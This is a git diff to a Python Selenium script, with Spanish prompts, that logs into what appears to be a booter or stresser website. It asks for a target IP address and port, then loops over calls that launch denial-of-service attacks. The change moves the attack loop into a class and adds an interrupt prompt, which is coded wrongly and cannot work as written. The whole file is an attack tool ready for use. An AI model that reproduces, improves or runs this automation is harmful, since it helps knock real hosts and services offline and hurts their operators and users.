@@ -4,6 +4,7 @@ from selenium.common.exceptions import *
 import time
 import traceback
 from rich.console import Console
+from rich.prompt import Prompt
 import logging
 import threading
 
@@ -22,10 +23,9 @@ main_logger.addHandler(logging.FileHandler(config.logs["main"]))
 main_logger.setLevel(logging.DEBUG)
 
 presets = Presets(driver_type=config.driver)
-service, options = presets.debug()
+service, options = presets.default()
 
-
-
+console = Console()
 
 
 
@@ -36,7 +36,7 @@ service, options = presets.debug()
 
 
 def get_user_input():
-    console = Console()
+    
 
     ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
     if ip == "":
@@ -77,35 +77,54 @@ def main():
         raise e
 
 
-    def main_loop():
-        i = 1
-        try:
-            bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
-            print(f"-----------------\nejecución: {i}\ncuenta: {config.account['username']}\n-----------------")
-            time.sleep(config.attack["time"])
-        except KeyboardInterrupt:
-            raise KeyboardInterrupt
-        except:
-            main_logger.error(traceback.format_exc())
-        finally:
-            i = i + 1
-            return
-    try:
-        try:
-            bot.login_form()
-            bot.DDoS_page()
-            bot.close_button()
-        except:
-            raise Exception("error al logearse")
-        time.sleep(5)
-            
-        while True:
+    class Loop:
+        def __init__(self) -> None:
+            self.count = 1
+            self.running = False
+
+        def start(self) -> any:
+            if not self.running:
+                self.running = True
+                self.run()
+            else:
+                raise Exception("this loop is already running")
+
+        def run(self) -> any:
             try:
-                main_loop()
-            except KeyboardInterrupt:
-                raise KeyboardInterrupt
-    finally:
-        ...
+                bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
+                print(f"-----------------\nejecución: {self.count}\ncuenta: {config.account['username']}\n-----------------")
+                time.sleep(config.attack["time"])
+
+            finally:
+                self.count = self.count + 1
+
+        def kill(self) -> any:
+            bot.driver.quit()
+            self.running = False
+
+
+    try:
+        bot.login_form()
+        bot.DDoS_page()
+        bot.close_button()
+    except:
+        raise Exception("error al logearse")
+
+    time.sleep(1)
+
+    loop = Loop()
+    loop.start()
+    while loop.running:
+        try:
+            loop.run()
+        except KeyboardInterrupt:
+            loop.kill()
+            console.print("Esperando a que termine el ataque...", style='bold red')
+            force = Prompt("forzar finalización: (Y/N)", choices=["Y", "y", "N", "n"], show_choices=False)
+            if force.casefold() == "Y":
+                quit(1)
+
+
 
 
 main()
